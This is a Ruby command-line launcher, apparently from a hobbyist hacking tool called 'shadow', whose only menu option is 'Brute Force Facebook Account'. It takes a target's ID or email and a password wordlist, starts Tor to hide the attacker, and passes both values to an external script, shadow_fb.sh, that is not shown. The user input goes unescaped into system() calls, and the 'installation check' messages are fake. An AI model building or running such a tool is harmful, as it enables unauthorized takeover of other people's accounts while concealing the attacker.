#!/usr/bin/env ruby

# Colors
white = "\033[1;37m"
grey = "\033[0;37m"
purple = "\033[0;35m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
Purple = "\033[0;35m"
Cyan = "\033[0;36m"
Cafe = "\033[0;33m"
Fiuscha = "\033[0;35m"
blue = "\033[1;34m"
nc = "\e[0m"

# ROOT PRIVILEGIES
if Process.uid != 0
  puts "#{red}You don't have Root privilegies, execute the script as root.#{nc}"
  exit 1
end

# Installation
sleep 1
puts "Checking Installation #{nc}"
puts "Checking Completed [#{green}✓#{nc}] #{nc}"
sleep 1
system("clear")

# Startup
puts `figlet shadow`
puts "#{red}codded by shadow#{nc}"
puts "#{Cyan}
-------------------------------------
⠀⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
-------------------------------------
#{nc}"
puts "#{yellow}attack..! : #{nc}"
puts ""
puts "		#{Cyan}1 : Brute Force Facebook Account#{nc}"
puts "		#{Cyan}99: Exit#{nc}"
print "Choice >  "
ch = gets.chomp.to_i

if ch == 1
  puts "			#{Cyan}Facebook Brute Force#{nc}"
  print "#{green}Enter Facebook ID / Email / Username / Number: #{nc}"
  id = gets.chomp
  print "Enter wordlist path : "
  wordlist = gets.chomp
  puts "#{nc}"
  system("service tor start")
  system("bash shadow_fb.sh #{id} #{wordlist}")
  puts " 		[+]#{yellow} Brute Force Complete #{nc}[#{green}✓#{nc}] #{nc}[+]"
  puts ""
  puts "               [+]#{yellow} Brute Force Complete #{nc}[#{green}✓#{nc}] #{nc}[+]"
  system("service tor stop")
  puts "		[+]#{red} Service Tor Stopped#{nc} [+]"
  puts "#{red}Wanna Back To Main Menu [ Y / n ] : #{nc}"
  check4 = gets.chomp
  if check4 == "Y" || check4 == "y" || check4 == "Yes" || check4 == "yes" || check4 == "YES"
    system("cd .. && ruby shadow.rb")
  else
    exit 1
  end
elsif ch == 99
  puts "#{red}Program Exit ...#{nc}"
  sleep 0.25
  exit 1
else
  puts "Not Found 404 , Exit"
  exit 1
end